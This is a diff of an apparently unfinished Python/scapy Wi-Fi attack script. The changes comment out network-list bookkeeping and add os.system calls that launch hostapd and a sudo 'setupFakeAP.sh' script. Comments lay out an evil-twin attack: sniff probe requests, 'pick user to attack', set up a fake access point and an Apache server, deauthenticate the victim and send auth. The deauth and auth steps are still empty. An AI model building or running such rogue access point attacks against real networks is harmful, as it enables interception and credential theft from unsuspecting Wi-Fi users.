@@ -4,7 +4,6 @@ from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, RadioT
 
 network_list = {}
 
-
 '''
 scans all interfaces
 '''
@@ -38,9 +37,9 @@ def packet_handler(pkt):
             bssid = pkt[Dot11].info
             channel = int(ord(pkt[Dot11Elt:3].info))
             mac = dot11_layer.addr2
-            new_network = Network(bssid, pkt[Dot11].addr2, channel)
-            new_duo = {mac: new_network}
-            network_list.update(new_duo)
+            #new_network = Network(bssid, pkt[Dot11].addr2, channel)
+            #new_duo = {mac: new_network}
+            #network_list.update(new_duo)
     else:
         sn = pkt.getlayer(Dot11).addr2
         rc = pkt.getlayer(Dot11).addr1
@@ -113,19 +112,16 @@ if __name__ == '__main__':
         except:
             print("Could not change interface mode to monitor.")
 
-
     # Sniffs for prob-reqs, display and pick user to attack
 
 
-    #setup fake ap
-
+    # setup fake ap
+    os.system('hostapd hostapd.conf')
 
     # setup apache server
+    os.system('sudo ./setupFakeAP.sh')
+
+    # deauth user
 
 
-    #deauth user
-
-
-
-    #send auth to user
-
+    # send auth to user
